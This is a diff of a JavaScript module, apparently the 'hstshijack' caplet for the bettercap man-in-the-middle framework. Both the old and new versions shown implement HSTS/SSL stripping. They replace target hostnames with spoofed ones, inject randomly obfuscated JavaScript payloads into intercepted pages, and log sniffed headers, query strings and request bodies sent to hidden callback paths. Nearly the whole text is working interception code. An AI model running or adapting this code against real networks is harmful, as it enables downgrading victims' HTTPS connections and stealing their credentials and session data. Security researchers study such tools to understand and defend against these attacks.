+		for (var i = 0; i < obfuscation_variables.length; i++) {
+			regexp = new RegExp(obfuscation_variables[i], "g")
+			payload = payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
+		}
+	}
 
-  for (a = 0; a < block_script_hosts.length; a++) {
-    if (
-         !block_script_hosts[a].match(/^\*$/i)
-      && !block_script_hosts[a].match(whole_prefix_wildcard_domain_selector)
-      && !block_script_hosts[a].match(whole_suffix_wildcard_domain_selector)
-    ) {
-      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.blockscripts value (got " + block_script_hosts[a] + ").");
-    }
-  }
-
-  if (obfuscate === "true") {
-    obfuscate = true;
-  } else {
-    obfuscate = false;
-  }
-
-  /* Prepare payloads. */
-  env["hstshijack.payloads"]
-    ? payload_entries = env["hstshijack.payloads"].replace(/\s/g, "").split(",")
-    : payload_entries = [];
-
-  for (a = 0; a < payload_entries.length; a++) {
-    if (
-         !payload_entries[a].match(/^\*:.+$/i)
-      && !payload_entries[a].match(/^(?:\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63}))):.+$/i)
-      && !payload_entries[a].match(whole_suffix_wildcard_domain_selector)
-    ) {
-      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.payloads value (got " + payload_entries[a] + ").");
-    }
-
-    payload_host = payload_entries[a].replace(/[:].*/, "");
-    payload_path = payload_entries[a].replace(/.*[:]/, "");
-
-    payload = "";
-    if (!(payload = readFile(payload_path))) {
-      log_fatal(on_blue + "hstshijack" + reset + " Could not read a payload (got " + payload_path + ").");
-    } else {
-      payload = payload
-        .replace(/obf_var_target_hosts/g, varname_target_hosts)
-        .replace(/obf_var_replacement_hosts/g, varname_replacement_hosts)
-        .replace(/obf_path_callback/g, callback_path)
-        .replace(/obf_path_ssl_index/g, ssl_index_path)
-        .replace(/obf_path_whitelist/g, whitelist_path);
-
-      if (obfuscate) {
-        obfuscation_variables = payload.match(/obf_[a-z0-9_]*/ig) || [];
-        for (b = 0; b < obfuscation_variables.length; b++) {
-          if (obfuscation_variables.indexOf(obfuscation_variables[b]) === b) {
-            regexp = new RegExp(obfuscation_variables[b], "g");
-            payload = payload.replace(regexp, randomString(8 + (Math.random() * 8)));
-          }
-        }
-      }
-
-      if (payloads[payload_host]) {
-        payloads[payload_host] = payloads[payload_host] + "\n" + payload + "\n";
-      } else {
-        payloads[payload_host] = payload + "\n";
-      }
-    }
-  }
-
-  /* Prepare payload container */
-  payload_container_prefix = payload_container_prefix.replace(/\{\{SESSION_ID_TAG\}\}/g, session_id);
-  payload_container_prefix = payload_container_prefix +
-    "var " + varname_target_hosts + " = [\"" + target_hosts.join("\",\"") + "\"];\n" +
-    "var " + varname_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"];\n";
-  payload_container_suffix = payload_container_suffix.replace(/\{\{SESSION_ID_TAG\}\}/g, session_id);
-
-  /* Prepare SSL index */
-  ssl_index_check = env["hstshijack.ssl.check"].toLowerCase() || "true";
-  all_domains = readFile(env["hstshijack.ssl.domains"]).split("\n");
-  if (all_domains.length === 0) {
-    log_info(on_blue + "hstshijack" + reset + " No indexed domains were found, index will be reset.");
-  } else {
-    if (ssl_index_check !== "false") {
-      log_info(on_blue + "hstshijack" + reset + " Indexing SSL domains ...");
-      all_domains
-        .sort()
-        .filter(function(domain, index, arr){
-          if (domain !== "" && arr.indexOf(domain) === index) {
-            indexDomain(domain);
-          }
-        });
-    } else {
-      ssl.domains = all_domains;
-      index_file_contents = readFile(env["hstshijack.ssl.index"]);
-      if (ssl.domains.length !== 0 && index_file_contents === "") {
-        log_fatal(on_blue + "hstshijack" + reset + " List of domains using SSL is not indexed. Please set your hstshijack.ssl.check value to true in your caplet.");
-      }
-      ssl.index = JSON.parse(index_file_contents);
-      log_info(on_blue + "hstshijack" + reset + " Skipped SSL index check for " + all_domains.length + " domain(s).");
-    }
-  }
-
-  /* Ensure targeted hosts are in SSL log (no wildcards). */
-  for (var a = 0; a < target_hosts.length; a++) {
-    if (target_hosts[a].indexOf("*") === -1) {
-      indexDomain(target_hosts[a]);
-    }
-  }
-
-  saveSSLIndex();
-  log_info(on_blue + "hstshijack" + reset + " Indexed " + ssl.domains.length + " domains.");
+	// Ensure targeted hosts are in SSL log.
+	for (var i = 0; i < target_hosts.length; i++) {
+		target = target_hosts[i]
+		if ( !target.match(/^\*/) ) {
+			if ( ssl_log.indexOf(target) == -1 ) {
+				ssl_log.push(target)
+				writeFile( env["hstshijack.log"], ssl_log.join("\n") )
+				env["hstshijack.log"] ? log_debug(on_blue + "hstshijack" + reset + " Saved " + target + " to SSL log.") : ""
+			}
+		}
+	}
 }
 
-function showConfig() {
-  /* Print module configuration. */
-  logStr  = "\n";
-  logStr += "  " + bold + "Caplet" + reset + "\n";
-  logStr += "\n";
-  logStr += "    " + yellow + " hstshijack.ssl.domains" + reset + " > " + (env["hstshijack.ssl.domains"] ? green + env["hstshijack.ssl.domains"] : red + "undefined") + reset + "\n";
-  logStr += "    " + yellow + "   hstshijack.ssl.index" + reset + " > " + (env["hstshijack.ssl.index"] ? green + env["hstshijack.ssl.index"] : red + "undefined") + reset + "\n";
-  logStr += "    " + yellow + "   hstshijack.ssl.check" + reset + " > " + (env["hstshijack.ssl.check"].match(/^true$/i) ? green + "true" : red + "false") + reset + "\n";
-  logStr += "    " + yellow + "      hstshijack.ignore" + reset + " > " + (env["hstshijack.ignore"] ? green + env["hstshijack.ignore"] : red + "undefined") + reset + "\n";
-  logStr += "    " + yellow + "     hstshijack.targets" + reset + " > " + (env["hstshijack.targets"] ? green + env["hstshijack.targets"] : red + "undefined") + reset + "\n";
-  logStr += "    " + yellow + "hstshijack.replacements" + reset + " > " + (env["hstshijack.replacements"] ? green + env["hstshijack.replacements"] : red + "undefined") + reset + "\n";
-  logStr += "    " + yellow + "hstshijack.blockscripts" + reset + " > " + (env["hstshijack.blockscripts"] ? green + env["hstshijack.blockscripts"] : red + "undefined") + reset + "\n";
-  logStr += "    " + yellow + "   hstshijack.obfuscate" + reset + " > " + (obfuscate ? green + "true" : red + "false") + reset + "\n";
-  logStr += "    " + yellow + "    hstshijack.payloads" + reset + " > ";
-  if (env["hstshijack.payloads"]) {
-    list = env["hstshijack.payloads"].replace(/\s/g, "").split(",");
-    logStr += green + list[0] + reset + "\n";
-    if (list.length > 1) {
-      for (a = 1; a < list.length; a++) {
-        logStr += "                            > " + green + list[a] + reset + "\n";
-      }
-    }
-  } else {
-    logStr += red + "undefined" + reset + "\n";
-  }
-  logStr += "\n";
-  logStr += "  " + bold + "Commands" + reset + "\n";
-  logStr += "\n";
-  logStr += "    " + bold + "       hstshijack.show" + reset + " : Show module info.\n";
-  logStr += "    " + bold + "hstshijack.ssl.domains" + reset + " : Show recorded domains with SSL.\n";
-  logStr += "    " + bold + "  hstshijack.ssl.index" + reset + " : Show SSL domain index.\n";
-  logStr += "\n";
-  logStr += "  " + bold + "Session info" + reset + "\n";
-  logStr += "\n";
-  logStr += "    " + bold + "    Session ID" + reset + " : " + session_id + "\n";
-  logStr += "    " + bold + " Callback path" + reset + " : " + callback_path + "\n";
-  logStr += "    " + bold + "Whitelist path" + reset + " : " + whitelist_path + "\n";
-  logStr += "    " + bold + "SSL index path" + reset + " : " + ssl_index_path + "\n";
-  logStr += "    " + bold + "   SSL domains" + reset + " : " + ssl.domains.length + " domain" + (ssl.domains.length === 1 ? "" : "s") + "\n";
-  console.log(logStr);
+function showModule() {
+	// Print module information on screen
+	logStr  = "\n"
+	logStr += "  " + bold + "Commands" + reset + "\n"
+	logStr += "\n"
+	logStr += "    " + bold + "hstshijack.show" + reset + " : Show module info.\n"
+	logStr += "\n"
+	logStr += "  " + bold + "Caplet" + reset + "\n"
+	logStr += "\n"
+	logStr += "    " + yellow + "           hstshijack.log" + reset + " > " + ( env["hstshijack.log"] ? green + env["hstshijack.log"] : red + "undefined" ) + reset + "\n"
+	logStr += "    " + yellow + "        hstshijack.ignore" + reset + " > " + ( env["hstshijack.ignore"] ? green + env["hstshijack.ignore"] : red + "undefined" ) + reset + "\n"
+	logStr += "    " + yellow + "       hstshijack.targets" + reset + " > " + ( env["hstshijack.targets"] ? green + env["hstshijack.targets"] : red + "undefined" ) + reset + "\n"
+	logStr += "    " + yellow + "  hstshijack.replacements" + reset + " > " + ( env["hstshijack.replacements"] ? green + env["hstshijack.replacements"] : red + "undefined" ) + reset + "\n"
+	logStr += "    " + yellow + "  hstshijack.blockscripts" + reset + " > " + ( env["hstshijack.blockscripts"] ? green + env["hstshijack.blockscripts"] : red + "undefined" ) + reset + "\n"
+	logStr += "    " + yellow + "     hstshijack.obfuscate" + reset + " > " + ( obfuscate ? green + "true" : red + "false" ) + reset + "\n"
+	logStr += "    " + yellow + "        hstshijack.encode" + reset + " > " + ( encode ? green + "true" : red + "false" ) + reset + "\n"
+	logStr += "    " + yellow + "hstshijack.payloads" + reset + " > "
+	if ( env["hstshijack.payloads"] ) {
+			list = env["hstshijack.payloads"].replace(/\s/g, "").split(",")
+			logStr += green + list[0] + reset + "\n"
+			if (list.length > 1) {
+				for ( var i = 0; i < (list.length-1); i++ ) {
+					logStr += "                              > " + green + list[i+1] + reset + "\n"
+				}
+			}
+	} else {
+		logStr += red + "undefined" + reset + "\n"
+	}
+	logStr += "\n"
+	logStr += "  " + bold + "Session info" + reset + "\n"
+	logStr += "\n"
+	logStr += "    " + bold + "     Session ID" + reset + " : " + session_id + "\n"
+	logStr += "    " + bold + "  Callback Path" + reset + " : /" + callback_path + "\n"
+	logStr += "    " + bold + " Whitelist Path" + reset + " : /" + whitelist_path + "\n"
+	logStr += "    " + bold + "   SSL Log Path" + reset + " : /" + ssl_log_path + "\n"
+	logStr += "    " + bold + "        SSL Log" + reset + " : " + ssl_log.length + " host" + (ssl_log.length == 1 ? "" : "s") + "\n"
+	console.log(logStr)
 }
 
 function onCommand(cmd) {
-  if (cmd === "hstshijack.show") {
-    showConfig();
-    return true;
-  }
-  if (cmd === "hstshijack.ssl.domains") {
-    if (ssl.domains.length > 20) {
-      truncated_domains = ssl.domains.slice(0, 20);
-      truncated_domains.push("...");
-      log_string = truncated_domains.join(reset + "\n    " + yellow);
-      console.log("\n" + bold + "  Recorded domains with SSL (" + ssl.domains.length + ")" + reset + "\n\n    " + yellow + log_string + reset + "\n");
-    } else {
-      console.log("\n" + bold + "  Recorded domains with SSL (" + ssl.domains.length + ")" + reset + "\n\n    " + yellow + ssl.domains.join(reset + "\n    " + yellow) + reset + "\n");
-    }
-    return true;
-  }
-  if (cmd === "hstshijack.ssl.index") {
-    log_string = "\n" + bold + "  SSL domain index (" + Object.keys(ssl.index).length + ")" + reset + "\n";
-    for (a = 0; a < Object.keys(ssl.index).length; a++) {
-      indexed_char = Object.keys(ssl.index)[a];
-      char_index = ssl.index[indexed_char];
-      log_string += "\n    " + yellow + indexed_char + reset + " (first: " + char_index[0] + ", last: " + char_index[1] + ")";
-    }
-    console.log(log_string + "\n");
-    return true;
-  }
-  if (cmd === "hstshijack.whitelist") {
-    console.log("\n" + JSON.stringify(whitelist, null, 2) + "\n");
-    return true;
-  }
+	if (cmd == "hstshijack.show") {
+		showModule()
+		return true
+	}
 }
 
 function onLoad() {
-  math_seed = new Date().getMilliseconds();
-  Math.random = function() {
-    return randomFloat();
-  }
+	math_seed = new Date().getMilliseconds()
+	Math.random = function() { return randomFloat() }
 
-  log_info(on_blue + "hstshijack" + reset + " Generating random variable names for this session ...");
-  session_id                = randomString(8 + Math.random() * 8);
-  varname_target_hosts      = randomString(8 + Math.random() * 8);
-  varname_replacement_hosts = randomString(8 + Math.random() * 8);
-  callback_path             = "/" + randomString(8 + Math.random() * 8);
-  whitelist_path            = "/" + randomString(8 + Math.random() * 8);
-  ssl_index_path            = "/" + randomString(8 + Math.random() * 8);
+	log_info(on_blue + "hstshijack" + reset + " Generating random variable names for this session ...")
+	session_id            = randomString( 4 + Math.random() * 12 )
+	callback_path         = randomString( 4 + Math.random() * 12 )
+	whitelist_path        = randomString( 4 + Math.random() * 12 )
+	ssl_log_path          = randomString( 4 + Math.random() * 12 )
+	var_target_hosts      = randomString( 4 + Math.random() * 12 )
+	var_replacement_hosts = randomString( 4 + Math.random() * 12 )
 
-  log_info(on_blue + "hstshijack" + reset + " Reading caplet ...");
-  configure();
-  log_info(on_blue + "hstshijack" + reset + " Module loaded.");
-  showConfig();
+	log_info(on_blue + "hstshijack" + reset + " Reading SSL log ...")
+	if ( !readFile( env["hstshijack.log"] ) ) {
+		log_info(on_blue + "hstshijack" + reset + " No SSL log file found, creating one now ...")
+		writeFile(env["hstshijack.log"], "")
+	}
+	ssl_log = readFile( env["hstshijack.log"] ).split("\n")
+
+	log_info(on_blue + "hstshijack" + reset + " Reading caplet ...")
+	configure()
+
+	log_info(on_blue + "hstshijack" + reset + " Module loaded.")
+	showModule()
 }
 
 function onRequest(req, res) {
-  if (req.Path === ssl_index_path) {
-    /*
-      SSL callback.
 
-      Requests made for this path should include a hostname in the query so
-      this module can send a HEAD request to learn HTTPS redirects.
-    */
-    log_debug(on_blue + "hstshijack" + reset + " SSL callback received from " + green + req.Client.IP + reset + " for " + bold + req.Query + reset + ".");
-    queried_host = req.Query;
-    if (getDomainIndex(queried_host, getIndexRange(queried_host.charAt(0))) === -1) {
-      log_debug(on_blue + "hstshijack" + reset + " Learning unencrypted HTTP response from " + queried_host + " ...");
-      req.Hostname = queried_host;
-      req.Path     = "/";
-      req.Query    = "";
-      req.Body     = "";
-      req.Method   = "HEAD";
-    }
-  } else if (req.Path === callback_path) {
-    /*
-      Basic callback.
+	ignored = false
 
-      Requests made for this path will be dropped.
-      Requests made for this path will be printed.
-    */
-    req.Scheme = "ignore";
-    logStr = on_blue + "hstshijack" + reset + " Callback received from " + green + req.Client.IP + reset + " for " + bold + req.Hostname + reset + "\n";
-    logStr += "  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_grey + "CALLBACK" + reset + " " + "http://" + req.Hostname + req.Path + (req.Query !== "" ? ("?" + req.Query) : "") + "\n  " + on_grey + " " + reset + " \n";
-    logStr += "  " + on_grey + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_grey + " " + reset + " \n";
-    headers = req.Headers.split("\r\n");
-    for (i = 0; i < headers.length; i++) {
-      if (headers[i].split(": ").length === 2) {
-        params = headers[i].split(": ");
-        logStr += "  " + on_grey + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n";
-      } else {
-        logStr += "  " + on_grey + " " + reset + "    " + yellow + headers[i] + reset + "\n";
-      }
-    }
-    logStr += "  " + on_grey + " " + reset + "  " + bold + "Query" + reset + "\n  " + on_grey + " " + reset + " \n";
-    queries = req.Query.split("&");
-    for (i = 0; i < queries.length; i++) {
-      if (queries[i].split("=").length === 2) {
-        params = queries[i].split("=");
-        logStr += "  " + on_grey + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\n";
-      } else {
-        logStr += "  " + on_grey + " " + reset + "    " + green + queries[i] + reset + "\n";
-      }
-    }
-    logStr += "  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  " + bold + "Body" + reset + "\n  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "    " + yellow + req.ReadBody() + reset + "\n";
-    log_info(logStr);
-  } else if (req.Path === whitelist_path) {
-    /*
-      Whitelisting callback.
+/* Handle special callbacks */
 
-      Requests made for this path will be dropped.
-      Requests made for this path will be printed.
-      Requests made for this path will stop all attacks towards this client with the requested hostname.
-    */
-    req.Scheme = "ignore";
-    logStr = on_blue + "hstshijack" + reset + " Whitelisting callback received from " + green + req.Client.IP + reset + " for " + bold + req.Hostname + reset + "\n";
-    logStr += "  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_white + "WHITELIST" + reset + " " + "http://" + req.Hostname + req.Path + (req.Query !== "" ? ("?" + req.Query) : "") + "\n  " + on_white + " " + reset + " \n";
-    logStr += "  " + on_white + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_white + " " + reset + " \n";
-    headers = req.Headers.split("\n");
-    for (i = 0; i < headers.length; i++) {
-      if (headers[i].split(": ").length === 2) {
-        params = headers[i].split(": ");
-        logStr += "  " + on_white + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n";
-      } else {
-        logStr += "  " + on_white + " " + reset + "    " + yellow + headers[i] + reset + "\n";
-      }
-    }
-    logStr += "  " + on_white + " " + reset + "  " + bold + "Query" + reset + "\n  " + on_white + " " + reset + " \n";
-    queries = req.Query.split("&");
-    for (i = 0; i < queries.length; i++) {
-      if (queries[i].split("=").length === 2) {
-        params = queries[i].split("=");
-        logStr += "  " + on_white + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\n";
-      } else {
-        logStr += "  " + on_white + " " + reset + "    " + green + queries[i] + reset + "\n";
-      }
-    }
-    logStr += "  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  " + bold + "Body" + reset + "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "    " + yellow + req.ReadBody() + reset + "\n";
-    log_info(logStr);
+	if (req.Path == "/" + callback_path || req.Path == "/" + whitelist_path || req.Path == "/" + ssl_log_path) {
 
-    /* Add requested hostname to whitelist. */
-    if (whitelist[req.Client.IP]) {
-      if (whitelist[req.Client.IP].indexOf(req.Hostname) === -1) {
-        whitelist[req.Client.IP].push(req.Hostname);
-      }
-    } else {
-      whitelist[req.Client.IP] = [req.Hostname];
-    }
-    /* Also whitelist unspoofed version of requested hostname. */
-    for (a = 0; a < target_hosts.length; a++) {
-      whole_regexp_set = toWholeRegexpSet(replacement_hosts[a], target_hosts[a]);
-      if (req.Hostname.match(whole_regexp_set[0])) {
-        whitelist[req.Client.IP].push(req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1]));
-        break;
-      }
-    }
-  } else {
-    /*
-      Not a callback.
+		// SSL log callback
+		// Requests made for this path will decode a base64 encoded hostname and send a HEAD request to this hostname in search for HTTPS redirects.
+		if (req.Path == "/" + ssl_log_path) {
+			queried_host = atob(req.Query)
+			log_debug(on_blue + "hstshijack" + reset + " Silent SSL log callback received from " + green + req.Client + reset + " for " + bold + queried_host + reset + ".")
+			for (var i = 0; i < target_hosts.length; i++) {
+				var regexp
+				if ( target_hosts[i].indexOf("*") != -1 ) {
+					regexp = toWholeWildcardRegexp(target_hosts[i])
+				} else {
+					regexp = toWholeRegexp(target_hosts[i])
+				}
+				if ( queried_host.match(regexp) ) {
+					if ( ssl_log.indexOf(queried_host) == -1 ) {
+						log_debug(on_blue + "hstshijack" + reset + " Learning HTTP response from " + queried_host + " ...")
+						req.Hostname = queried_host
+						req.Path     = "/"
+						req.Query    = ""
+						req.Body     = ""
+						req.Method   = "HEAD"
+					}
+					break
+				}
+			}
+		}
 
-      Redirect client to the real host if a whitelist callback was received previously.
-      Restore spoofed hostnames and schemes in request.
-    */
-    if (whitelist[req.Client.IP]) {
-      for (a = 0; a < whitelist[req.Client.IP].length; a++) {
-        whole_regexp_set = toWholeRegexpSet(whitelist[req.Client.IP][a], "");
-        if (req.Hostname.match(whole_regexp_set[0])) {
-          /* Restore requested hostname if it was spoofed. */
-          var unspoofed_host;
-          for (b = 0; b < replacement_hosts.length; b++) {
-            whole_regexp_set = toWholeRegexpSet(replacement_hosts[b], target_hosts[b]);
-            if (req.Hostname.match(whole_regexp_set[0])) {
-              unspoofed_host = req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1]);
-              query = (req.Query !== "" ? ("?" + req.Query) : "");
-              res.SetHeader("Location", "https://" + unspoofed_host + req.Path + query);
-              res.Status = 301;
-              log_info(on_blue + "hstshijack" + reset + " Redirecting " + green + req.Client.IP + reset + " from " + bold + req.Hostname + reset + " to " + bold + unspoofed_host + reset + " because we received a whitelisting callback.");
-              return;
-            }
-          }
-        }
-      }
-    }
+		// Basic callback
+		// Requests made for this path will print sniffed data.
+		// Requests made for this path will not be proxied.
+		if (req.Path == "/" + callback_path) {
+			log_info(on_blue + "hstshijack" + reset + " Silent callback received from " + green + req.Client + reset + " for " + bold + req.Hostname + reset)
 
-    /* Restore original hostnames. */
-    for (a = 0; a < target_hosts.length; a++) {
-      /* Restore original hostnames in headers. */
-      regexp_set = toRegexpSet(replacement_hosts[a], target_hosts[a]);
-      if (req.Headers.match(regexp_set[0])) {
-        req.Headers = req.Headers.replace(regexp_set[0], regexp_set[1]);
-        log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + replacement_hosts[a] + reset + " in request header(s).");
-      }
+			var logStr = "\n  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_grey + "CALLBACK" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_grey + " " + reset + " \n"
 
-      if (req.Query !== "") {
-        /* Restore original hostnames in query URI. */
-        if (req.Query.match(regexp_set[0])) {
-          req.Query = req.Query.replace(regexp_set[0], regexp_set[1]);
-          log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + replacement_hosts[a] + reset + " in query URI.");
-        }
+			logStr += "  " + on_grey + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_grey + " " + reset + " \n"
+			headers = req.Headers.split("\r\n")
+			for (var i = 0; i < headers.length; i++) {
+				if ( headers[i].split(": ").length == 2 ) {
+					params = headers[i].split(": ")
+					logStr += "  " + on_grey + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n"
+				} else {
+					logStr += "  " + on_grey + " " + reset + "    " + yellow + headers[i] + reset + "\n"
+				}
+			}
 
-        /* Restore original hostnames in encoded query URI parameters. */
-        query_params = req.Query.split("&");
-        new_params = [];
-        for (b = 0; b < query_params.length; b++) {
-          param = query_params[b];
-          param_parts = param.match(selector_query_param);
-          if (param_parts) {
-            param_name = param_parts[1];
-            param_value = param_parts[2];
-            if (param_value.indexOf("%") !== -1) {
-              param_value_decoded = decodeURIComponent(param_value);
-              if (param_value !== param_value_decoded) {
-                if (param_value_decoded.match(regexp_set[0])) {
-                  param_value_decoded_spoofed = param_value_decoded.replace(
-                    regexp_set[0],
-                    regexp_set[1]);
-                  new_params.push(
-                    param_name + "=" + encodeURIComponent(param_value_decoded_spoofed));
-                } else {
-                  new_params.push(param);
-                }
-              } else {
-                new_params.push(param);
-              }
-            } else {
-              if (param_value.match(regexp_set[0])) {
-                param_value_spoofed = param_value.replace(regexp_set[0], regexp_set[1]);
-                new_params.push(param_name + "=" + param_value_spoofed);
-              } else {
-                new_params.push(param);
-              }
-            }
-          } else {
-            new_params.push(param);
-          }
-        }
-        new_query_string = new_params.join("&");
-        if (new_query_string !== req.Query) {
-          req.Query = new_query_string;
-        }
-      }
+			logStr += "  " + on_grey + " " + reset + "  " + bold + "Query" + reset + "\n  " + on_grey + " " + reset + " \n"
+			queries = req.Query.split("&")
+			for (var i = 0; i < queries.length; i++) {
+				if ( queries[i].split("=").length == 2 ) {
+					params = queries[i].split("=")
+					logStr += "  " + on_grey + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\n"
+				} else {
+					logStr += "  " + on_grey + " " + reset + "    " + green + queries[i] + reset + "\n"
+				}
+			}
 
-      /* Restore original hostname of request. */
-      whole_regexp_set = toWholeRegexpSet(replacement_hosts[a], target_hosts[a])
-      if (req.Hostname.match(whole_regexp_set[0])) {
-        spoofed_host = req.Hostname;
-        req.Hostname = req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1]);
-        req.Scheme   = "https";
-        log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + spoofed_host + reset + " to " + req.Hostname + " and restored HTTPS scheme.");
-      }
-    }
+			logStr += "  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  " + bold + "Body" + reset + "\n  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "    " + yellow + req.ReadBody() + reset + "\n"
 
-    /* Restore HTTPS scheme. */
-    if (getDomainIndex(req.Hostname, getIndexRange(req.Hostname.charAt(0))) !== -1) {
-      /* Restore HTTPS scheme of request if domain is indexed. */
-      if (req.Scheme !== "https") {
-        req.Scheme = "https";
-        log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + bold + req.Hostname + reset + ".");
-      }
-      /* Restore HTTPS scheme in request headers if domains are indexed. */
-      escaped_domain = req.Hostname.replace(selector_all_dots, "\\.").replace(selector_all_dashes, "\\-");
-      regexp = new RegExp("http://" + escaped_domain + "([^a-z0-9\\-\\.]|$)", "ig");
-      if (req.Headers.match(regexp)) {
-        req.Headers = req.Headers.replace(regexp, "https://" + req.Hostname + "$1");
-        log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + req.Hostname + " in request headers.");
-      }
-    } else { /* If requested domain is not indexed. */
-      log_debug(on_blue + "hstshijack" + reset + " Domain " + bold + req.Hostname + reset + " is not indexed.");
-      if (req.Scheme !== "https") {
-        for (b = 0; b < target_hosts; b++) {
-          /* Restore HTTPS scheme of request if domain is targeted. */
-          whole_regexp_set = toWholeRegexpSet(target_hosts[b], "");
-          if (req.Hostname.match(whole_regexp_set[0])) {
-            req.Scheme = "https";
-            log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of targeted domain " + bold + req.Hostname + reset + ".");
-            break;
-          }
-          /* Restore HTTPS scheme in request headers if domains are targeted. */
-          regexp_set = toRegexpSet(target_hosts[b], "");
-          matches = req.Headers.match(regexp_set[0]);
-          for (c = 0; c < matches.length; c++) {
-            escaped_domain = matches[c].replace(selector_all_dots, "\\.").replace(selector_all_dashes, "\\-");
-            regexp = new RegExp("http://" + escaped_domain + "([^a-z0-9\\-\\.]|$)", "ig");
-            req.Headers = req.Headers.replace(regexp, "https://" + matches[c] + "$1");
-            log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + req.Hostname + " in request headers.");
-          }
-        }
-      }
-    }
-  }
+			console.log(logStr)
+
+			req.Scheme = "ignore"
+		}
+
+		// Whitelist callback
+		// Requests made for this path will print sniffed data.
+		// Requests made for this path will not be proxied.
+		// Requests made for this path will stop all attacks towards this client for the requested hostname.
+		if (req.Path == "/" + whitelist_path) {
+			log_info(on_blue + "hstshijack" + reset + " Silent, whitelisting callback received from " + green + req.Client + reset + " for " + bold + req.Hostname + reset)
+
+			var logStr = "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_white + "WHITELIST" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_white + " " + reset + " \n"
+
+			logStr += "  " + on_white + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_white + " " + reset + " \n"
+			headers = req.Headers.split("\n")
+			for (var i = 0; i < headers.length; i++) {
+				if ( headers[i].split(": ").length == 2 ) {
+					params = headers[i].split(": ")
+					logStr += "  " + on_white + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\n"
+				} else {
+					logStr += "  " + on_white + " " + reset + "    " + yellow + headers[i] + reset + "\n"
+				}
+			}
+
+			logStr += "  " + on_white + " " + reset + "  " + bold + "Query" + reset + "\n  " + on_white + " " + reset + " \n"
+			queries = req.Query.split("&")
+			for (var i = 0; i < queries.length; i++) {
+				if ( queries[i].split("=").length == 2 ) {
+					params = queries[i].split("=")
+					logStr += "  " + on_white + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\n"
+				} else {
+					logStr += "  " + on_white + " " + reset + "    " + green + queries[i] + reset + "\n"
+				}
+			}
+
+			logStr += "  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  " + bold + "Body" + reset + "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "    " + yellow + req.ReadBody() + reset + "\n"
+
+			console.log(logStr)
+
+			req.Scheme = "ignore"
+			// Add requested hostname (spoofed and/or original) to whitelist
+			if (whitelist[req.Client]) {
+				whitelisted_hosts = whitelist[req.Client].split(",")
+				if ( whitelisted_hosts.indexOf(req.Hostname) == -1 ) {
+					whitelisted_hosts += "," + req.Hostname
+				}
+			} else {
+				whitelist[req.Client] = req.Hostname
+			}
+			// Also add (wildcard) targets and replacements for requested hostname
+			for (var i = 0; i < target_hosts.length; i++) {
+				var regexp_targets,
+				    regexp_replacements
+				if ( target_hosts.indexOf("*") != -1 ) {
+					regexp_targets      = toWholeWildcardRegexp(target_hosts[i])
+					regexp_replacements = toWholeWildcardRegexp(replacement_hosts[i])
+				} else {
+					regexp_targets      = toWholeRegexp(target_hosts[i])
+					regexp_replacements = toWholeRegexp(replacement_hosts[i])
+				}
+				if ( req.Hostname.match(regexp_targets) || req.Hostname.match(regexp_replacements) ) {
+					whitelist[req.Client] += "," + replacement_hosts[i]
+					whitelist[req.Client] += "," + target_hosts[i]
+				}
+			}
+		}
+
+	} else {
+
+	/* Attack or ignore request */
+
+		// Redirect client to the real host if a whitelist callback was received.
+		if (whitelist[req.Client]) {
+			whitelisted_hosts = whitelist[req.Client].split(",")
+			for (var a = 0; a < whitelisted_hosts.length; a++) {
+				var regexp
+				if ( whitelisted_hosts[a].indexOf("*") != -1 ) {
+					regexp = toWholeWildcardRegexp(whitelisted_hosts[a])
+				} else {
+					regexp = toWholeRegexp(whitelisted_hosts[a])
+				}
